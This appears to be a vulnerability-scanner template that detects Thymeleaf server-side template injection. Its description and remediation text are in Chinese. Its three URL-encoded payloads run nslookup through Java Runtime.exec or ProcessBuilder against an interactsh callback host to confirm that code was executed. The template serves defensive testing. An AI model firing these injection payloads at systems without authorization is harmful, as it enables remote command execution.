id: thymeleaf-oob

info:
  name: Thymeleaf 带外服务端模板注入（DAST）
  author: ritikchaddha
  severity: high
  description: |
    Thymeleaf 服务端模板注入发生在应用把用户输入作为模板语法渲染时，攻击者可借模板表达式访问运行时对象、调用函数或触发外部请求。模板向查询参数和请求体追加/替换 Thymeleaf 专用载荷，并通过 interactsh DNS SRV 外带交互确认表达式在服务端被执行。
  impact: |
    - 攻击者可能在模板引擎上下文中执行命令、读取环境变量、访问应用对象或向外发送敏感信息。
    - 若模板进程具备数据库、文件系统或云资源权限，SSTI 可进一步导致应用服务器被接管。
  remediation: |
    - 不要把用户输入拼接进服务端模板源码；使用安全变量绑定，并将模板文件与用户内容分离。
    - 启用模板沙箱和 allowlist，限制危险对象、反射、命令执行和网络访问，并升级模板引擎到安全版本。
  reference:
    - https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
  metadata:
    max-request: 1
  tags: thymeleaf,oob,ssti,oast,dast,vuln

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'
          - 'method == "POST"'
          - 'method == "PUT"'
    payloads:
      injection:
        - "%24%7B%23rt%20%3D%20%40java.lang.Runtime%40getRuntime%28%29%2C%23rt.exec%28%27nslookup%20-type%3DSRV%20{{interactsh-url}}%27%29%7D"
        - "%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27nslookup%20-type%3DSRV%20{{interactsh-url}}%27%29%7D"
        - "%24%7Bnew%20java.lang.ProcessBuilder%28%27nslookup%27%2C%27-type%3DSRV%27%2C%27{{interactsh-url}}%27%29.start%28%29%7D"

    fuzzing:
      - parts:
          - query
          - body
        type: replace
        mode: single
        fuzz:
          - "{{injection}}"

    matchers:
      - type: dsl
        name: request-matcher
        dsl:
          - "contains(interactsh_protocol,'dns')"
          - "contains(interactsh_request,'srv')"
        condition: and
